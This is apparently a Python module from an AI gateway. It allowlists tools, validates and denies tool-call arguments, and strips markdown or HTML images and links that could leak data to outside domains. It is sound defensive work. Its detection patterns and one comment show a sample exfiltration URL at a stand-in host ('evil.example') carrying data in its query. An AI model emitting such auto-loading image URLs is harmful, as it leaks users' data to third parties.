"""Agent-specific output controls: which tools a model may call and with what arguments,
and model output that would exfiltrate data when rendered.

Used by every surface that carries tool calls: /v1/chat/completions (OpenAI shape),
/v1/messages (Anthropic tool_use), /v1/responses (function_call items) and the MCP
gateway (tools/call).
"""
from __future__ import annotations

import json
import re
from fnmatch import fnmatchcase
from typing import Any, Iterable, List, Optional, Tuple
from urllib.parse import urlparse

from app.control.policy import Policy, ToolsPolicy
from app.core.logger import logger


# --- tools ----------------------------------------------------------------------------------

def _matches(name: str, patterns: Iterable[str]) -> bool:
    return any(fnmatchcase(name, p) for p in patterns)


def tool_allowed(tools: ToolsPolicy, name: str) -> bool:
    return tools.allowed is None or _matches(name or "", tools.allowed)


def declared_tool_names(tools_param: Any) -> List[str]:
    """Names from an OpenAI ``tools`` / legacy ``functions`` list, an Anthropic ``tools``
    list, or a Responses API ``tools`` list."""
    names = []
    for tool in tools_param or []:
        if not isinstance(tool, dict):
            continue
        function = tool.get("function") if isinstance(tool.get("function"), dict) else None
        name = (function or {}).get("name") or tool.get("name")
        if isinstance(name, str) and name:
            names.append(name)
    return names


def check_declared_tools(policy: Policy, tools_param: Any) -> List[str]:
    """Reasons for declared tools the policy does not allow (``tool_not_allowed:<name>``).
    Rejecting at declaration time stops the model from ever being offered the tool."""
    if policy.tools.action == "off" or policy.tools.allowed is None:
        return []
    return [f"tool_not_allowed:{n}" for n in declared_tool_names(tools_param) if not tool_allowed(policy.tools, n)]


def _parse_arguments(arguments: Any) -> Tuple[Any, Optional[str]]:
    if isinstance(arguments, (dict, list)):
        return arguments, None
    if arguments in (None, ""):
        return {}, None
    try:
        return json.loads(arguments), None
    except (TypeError, ValueError):
        return None, "arguments are not valid JSON"


def check_tool_call(policy: Policy, name: str, arguments: Any) -> List[str]:
    """Policy violations of one model-generated tool call, as reasons."""
    tools = policy.tools
    if tools.action == "off":
        return []
    reasons = []
    if not tool_allowed(tools, name):
        return [f"tool_not_allowed:{name}"]
    rules = [r for r in tools.rules if fnmatchcase(name or "", r.name)]
    if not rules:
        return reasons
    parsed, error = _parse_arguments(arguments)
    serialized = arguments if isinstance(arguments, str) else json.dumps(arguments, default=str)
    for rule in rules:
        if rule.arguments_schema is not None:
            if error:
                reasons.append(f"tool_arguments_invalid:{name}")
            else:
                from jsonschema import Draft202012Validator

                errors = list(Draft202012Validator(rule.arguments_schema).iter_errors(parsed))
                if errors:
                    logger.warning(f"Tool call {name} violates its argument schema: {errors[0].message}")
                    reasons.append(f"tool_arguments_invalid:{name}")
        for pattern in rule.deny_argument_patterns:
            if re.search(pattern, serialized or "", flags=re.IGNORECASE):
                reasons.append(f"tool_arguments_denied:{name}")
                break
    return sorted(set(reasons), key=reasons.index)


def check_openai_tool_calls(policy: Policy, tool_calls: Any) -> List[str]:
    reasons: List[str] = []
    for call in tool_calls or []:
        function = call.get("function") if isinstance(call, dict) else None
        if isinstance(function, dict):
            reasons.extend(check_tool_call(policy, function.get("name", ""), function.get("arguments")))
    return reasons


# --- exfiltration ---------------------------------------------------------------------------

_MD_IMAGE = re.compile(r"!\[([^\]\n]{0,500})\]\(\s*<?([^)\s>]+)>?(?:\s+\"[^\"\n]*\")?\s*\)")
_MD_LINK = re.compile(r"(?<!!)\[([^\]\n]{0,500})\]\(\s*<?([^)\s>]+)>?(?:\s+\"[^\"\n]*\")?\s*\)")
_HTML_IMG = re.compile(r"<img\b[^>]*?\bsrc\s*=\s*[\"']?([^\"'\s>]+)[^>]*>", re.IGNORECASE)
# Reference-style image definitions: "[1]: https://evil.example/x?d=..."
_MD_REF_DEF = re.compile(r"^\s{0,3}\[[^\]\n]+\]:\s*<?(\S+?)>?\s*$", re.MULTILINE)
_LONG_QUERY = 100


def _host_allowed(url: str, allowed_domains: List[str]) -> bool:
    try:
        host = (urlparse(url).hostname or "").lower()
    except ValueError:
        return False
    if not host:
        return True  # relative URL: same origin as the app
    return any(host == d or host.endswith("." + d) for d in allowed_domains)


def _carries_data(url: str) -> bool:
    if url.lower().startswith("data:"):
        return False  # inline data, nothing is sent anywhere
    try:
        parsed = urlparse(url)
    except ValueError:
        return True
    return bool(parsed.query or parsed.fragment) or len(parsed.path) > 120


def scrub_exfiltration(text: str, policy: Policy) -> Tuple[str, List[str]]:
    """(text with exfiltration channels neutralised, reasons).

    * Images (markdown, reference definitions, HTML ``<img>``) pointing outside
      ``allowed_domains`` with a query, fragment or very long path are removed: they load
      without a click, so the URL itself is the leak.
    * Links outside ``allowed_domains`` with a very long query are reduced to their text.
    """
    exfil = policy.exfiltration
    if exfil.action == "off" or not text or ("](" not in text and "<img" not in text.lower() and "]:" not in text):
        return text, []
    reasons: List[str] = []
    strip = exfil.action == "strip"
    allowed = exfil.allowed_domains

    def image(match):
        url = match.group(2)
        if _host_allowed(url, allowed) or not _carries_data(url):
            return match.group(0)
        reasons.append("exfiltration:image")
        return f"[image removed: {match.group(1)[:80]}]" if strip else match.group(0)

    def html_image(match):
        url = match.group(1)
        if _host_allowed(url, allowed) or not _carries_data(url):
            return match.group(0)
        reasons.append("exfiltration:image")
        return "[image removed]" if strip else match.group(0)

    def link(match):
        url = match.group(2)
        try:
            query = urlparse(url).query
        except ValueError:
            query = ""
        if _host_allowed(url, allowed) or len(query) < _LONG_QUERY:
            return match.group(0)
        reasons.append("exfiltration:link")
        return match.group(1) if strip else match.group(0)

    def ref_definition(match):
        url = match.group(1)
        if _host_allowed(url, allowed) or not _carries_data(url):
            return match.group(0)
        reasons.append("exfiltration:image")
        return "" if strip else match.group(0)

    text = _MD_IMAGE.sub(image, text)
    text = _HTML_IMG.sub(html_image, text)
    text = _MD_REF_DEF.sub(ref_definition, text)
    text = _MD_LINK.sub(link, text)
    return text, sorted(set(reasons))


# --- reporting ------------------------------------------------------------------------------

def audit_output(policy: Policy, *, surface: str, decision=None, findings: Optional[List[str]] = None) -> None:
    """Audit what happened to one response: a tool / moderation verdict and any output
    findings (exfiltration channels removed or flagged). No response text is stored."""
    from app.control import audit
    from app.core.context import app_context, request_id_context, tenant_context

    events = []
    if decision is not None and decision.action != "allow":
        events.append((f"response.{decision.action}", decision.action, decision.all_reasons()))
    if findings:
        action = "redact" if policy.exfiltration.action == "strip" else "flag"
        events.append((f"response.{action}", action, list(findings)))
    for event_type, action, reasons in events:
        audit.record(event_type, action=action, reasons=reasons, details={"surface": surface,
                     "policy_mode": policy.mode}, tenant=tenant_context.get(), app=app_context.get(),
                     request_id=request_id_context.get(), monitor=action == "would_block")
